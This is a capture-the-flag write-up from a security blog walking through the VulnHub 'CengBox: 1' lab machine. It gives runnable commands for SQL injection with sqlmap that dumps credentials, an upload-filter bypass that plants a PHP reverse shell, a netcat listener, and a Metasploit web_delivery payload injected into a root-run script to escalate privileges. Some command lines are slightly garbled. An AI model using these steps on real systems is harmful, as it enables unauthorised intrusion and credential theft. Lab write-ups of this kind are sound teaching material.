@@ -1,0 +1,113 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">CengBox: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-05-21T18:39:39+00:00">May 21, 2020</time><time class="updated" datetime="2025-06-10T20:10:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, I am going to share a writeup for the boot2root challenge of the vulnhub machine “Cengbox:1”. It was an easy box based on the Linux machine which helped me learn many new things. The goal is to find the user and root flag.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Reconnaissance </strong></span>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+<li><span style="color: #000000;">Dirb</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">SQLmap</span></li>
+<li><span style="color: #000000;">File Upload</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation </strong></span>
+<ul>
+<li><span style="color: #000000;">Pspy script</span></li>
+<li><span style="color: #000000;">Meterpreter session</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Capturing the flag </strong></span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough </strong></span></h3>
+<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
+<p><span style="color: #000000;">Let’s start recon for this machine using Netdiscover, It is used for identifying the IP address of the various machines in our network work It works as traceroute.</span></p>
+<pre class="lang:default decode:true ">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-JGEF-wU5TwY/Xsal13_UC8I/AAAAAAAAkNA/bNJVYMmWzJEdXUqvkL_ztxeOXpDKWxOLACLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">As we got our target IP address for the machine (<strong>192.168.1.106</strong>), Next, we use nmap for the port scanning and further information gathering on the target host.</span></p>
+<pre class="lang:default decode:true ">nmap -p- -A 192.168.1.106</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-R87TBhUve8c/Xsal5LNef8I/AAAAAAAAkNk/t5316faKncwm3eHPwyrH2Ul18wOmh-JlQCLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">Since port 80 is open, Let’s explore the domain or webpage on this IP address using Web Browser.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DcMGsse0Daw/Xsal7mCCAkI/AAAAAAAAkOA/qbkd58jV6_0XznZdxOjChBUSKRk5Ro80wCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">We will also perform fuzzing to find the endpoints using the dirbuster tool with the big.txt wordlist which can be located inside /usr/share/wordlists directory.</span></p>
+<pre class="lang:default decode:true ">dirb http://192.168.1.106/ /usr/share/wordlists/big.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-a7FHElY6Mys/Xsal7vtVmfI/AAAAAAAAkOE/Vr4pdhgQ0AY-zyTdALO9DKMjqC0GDdGoACLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">We got some directories like (uploads, Masteradmin, etc). After checking all the directories, we got an Error Page with the endpoint masteradmin/.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-csHfcfo8IQU/Xsal7924ofI/AAAAAAAAkOI/SfVhe_1E9k09zvtm7YTbIAL-jWNhro6sQCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">We decided to do fuzzing for http://192.168.1.106/masteradmin using the dirbuster tool but with the extension, filter to find any php files that might be present in the masteradmin directory.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.106/masteradmin -X .php</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zQUUGdl1ukY/Xsal8QhmnBI/AAAAAAAAkOM/oyz3z9Mkn7QLhQIkjOCw7rpreS3eTBJNgCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">In the above image, we can see that there are login.php and upload.php endpoints as we can try to take a reverse shell using upload functionality or we can try to bypass the login page using SQL injection. So, let’s try to explore these endpoints for further enumeration.</span></p>
+<p><span style="color: #000000;">Landing on the login page we can see that we will have to bypass the authentication panel i.e., username and password both.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ywCIOsFNyDc/Xsal8uQE23I/AAAAAAAAkOQ/thSChhJebOszIXLZp2tN4zDZ9rNNvz1gwCLcBGAsYHQ/s1600/7.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Since we got the login page for which we need to find the username and password to login the page for further exploitation. Here, I tried brute-forcing the parameters but it didn’t work for me so I chose to try the hand at SQL Injection with the sqlmap tool. I ran it with the URL as the parameter and we also use the forms, dbs, and batch parameters.</span></p>
+<pre class="lang:default decode:true ">sqlmap -u http://192.168.1.106/masteradmin/login.php --forms --dbs --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-U376XiP3iwY/Xsal9JwQbKI/AAAAAAAAkOU/TuHPyO4GM-YQoLJkehXqYeZypnZpUkmIQCLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">Sqlmap works for a while and gives us the names of some of the databases. Out of the extracted databases, one that interests us is the cengbox. So, we decide to enumerate it further.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hhCpahoI1HI/Xsal9ITQ91I/AAAAAAAAkOY/dANSx1uBYuoABJM6mcICr4Be_mdbVI_UACLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">Further dumping the data of this database by using the command given below:</span></p>
+<pre class="lang:default decode:true">sqlmap -u http://192.168.1.106/masteradmin/login.php --forms -D cengbox --dump-all --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-9gsPDAxURbY/Xsal181gegI/AAAAAAAAkM8/v3jYL5lVZtUcSv5s2-GWNxdOVRtOwiQggCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">Here we can see that there is a table named admin inside the database we were looking in. Looking further we found the credentials for masteradmin.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-GY2YxRcVbkU/Xsal11JxlOI/AAAAAAAAkNE/KInwRztnCfwM01rJCEPJEdQG7EhMQ_g6wCLcBGAsYHQ/s1600/11.png"/></p>
+<p><span style="color: #000000;">So the valid credentials for this login page are</span></p>
+<pre class="lang:default decode:true">Username: masteradmin
+Password: C3ng0v3R00T1!</pre>
+<p><span style="color: #000000;">After logging in as masteradmin, we see that we have a file upload functionality.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-SsxOjkEoCDE/Xsal2_dVmGI/AAAAAAAAkNM/s-wR5t3JIvgxkNg3LBlmGf-PM9WZ0ow8wCLcBGAsYHQ/s1600/13.png"/></p>
+<p><span style="color: #000000;">At first, I tried to upload the php-reverse-shell.php from the available web shell directory to get a reverse shell on the target machine but it told me that the extension is not allowed. I need to upload a CENG file.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8MoKe2lrCUc/Xsal3ILYRQI/AAAAAAAAkNQ/or4roMJrs-01m1MN2z3bJcYqs-fZJ9sogCLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;">So to bypass this upload filter I tried changing the extension of the same reverse shell php file as shown in the image below.</span></p>
+<pre class="lang:default decode:true ">mv php-reverse-shell.php shell.ceng</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-AqgF89ZwhMg/Xsal3W0L0gI/AAAAAAAAkNU/gcI-pISG4GgnOZ3-TND5k06RpDfZWsTzACLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">After renaming the shell we tried to upload the file again. This time I was successful in uploading the file.  Using netcat listener we will establish the connection and got the shell.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jaHlLSF6g3g/Xsal4MH4hcI/AAAAAAAAkNc/Bm9EiHENEH4K_m_9ZK-VCgN23zA6vayqwCLcBGAsYHQ/s1600/18.png"/></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echostty raw -echo</pre>
+<p><span style="color: #000000;">During our enumeration we got a user named cengover we also git it in the above scanning of sqlmap we got the credentials. Here we will switch the user from www-data to cengover and for that we will use the password that we found was <strong>C3ng0v3R00t1!</strong></span></p>
+<pre class="lang:default decode:true">su cengover
+password: C3ng0v3R00t1!</pre>
+<p><span style="color: #000000;">After getting the shell, I looked around for the user flag.</span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Now moving towards the root flag, we need to check the permissions and some hidden processes running in the machine for finding the hidden processes running in the machine we need to download the pspy script in the remote machine. We will use the wget command for it.</span></p>
+<pre class="lang:default decode:true">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-AUTld9tcqz4/Xsal4yKxIqI/AAAAAAAAkNg/bbUOZKpRblYS_W7752nL7M6DhOmXQNbewCLcBGAsYHQ/s1600/19.png"/></p>
+<p><span style="color: #000000;">Now, we need to provide the proper permissions. After that, we will execute the script.</span></p>
+<pre class="lang:default decode:true ">chmod 777 pspy64s
+./pspy64s</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-grWrYEdjEB0/Xsal5DeqkfI/AAAAAAAAkNo/rFmqusjXvOI8PYqi923rvBSnXP0ltLu9gCLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;">Below are some hidden processes we got one python script is having the md5check.py. </span><span style="color: #000000;">Let’s check the permissions on this file.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-z2Icw-yq9XI/Xsal5ZIiJ-I/AAAAAAAAkNs/ijfsCtdQGWYjrhYb4_1nKAUl8M1Y4NL0QCLcBGAsYHQ/s1600/21.png"/></p>
+<p><span style="color: #000000;">Here, we can see that md5check.py has the read and write permissions.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zVLIIowefY4/Xsal52GcQeI/AAAAAAAAkNw/ZWlmF35VbZIMoNpalNbuQCZxfvKImmkVwCLcBGAsYHQ/s1600/22.png"/></p>
+<p><span style="color: #000000;">Now using msfconsole will make one executable shell. And create one session to gain access through meterpreter. Meterpreter is generated only when the session is created. It helps in gaining full access to the target machine.</span></p>
+<pre class="lang:default decode:true ">use exploit/multi/script/web_delivery
+set lhost 192.168.1.112
+set lport 6789
+exploit</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8OMGwD7enlM/Xsal6LaGjlI/AAAAAAAAkN0/XuA1D6SF3UwRwQWK0WO8pRXHwM003rqMgCLcBGAsYHQ/s1600/24.png"/></p>
+<p><span style="color: #000000;">Edit the md5check.py file and insert the payload generated inside it and save the file.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IGQHcOwmrjU/Xsal6dcYK0I/AAAAAAAAkN4/E2CPoFGSOBgDT7E-FKHKr50gqao0Y7y8wCLcBGAsYHQ/s1600/25.png"/></p>
+<p><span style="color: #000000;">This gave the shell access in the meterpreter session created before.</span></p>
+<pre class="lang:default decode:true ">cd /root
+ls
+cat root.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jipqu5Yk3Fs/Xsal7C-v1QI/AAAAAAAAkN8/ZmnM7mW7eUodDrv1a0wAX1tyk09lgvJxQCLcBGAsYHQ/s1600/26.png"/></p>
+<p><span style="color: #000000;">Here we got our root flag. Happy Hacking! See you next time.</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sushma Ahuja is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on</span> <a href="https://www.linkedin.com/in/sushma-ahuja-284907157/"><strong>LinkedIn</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
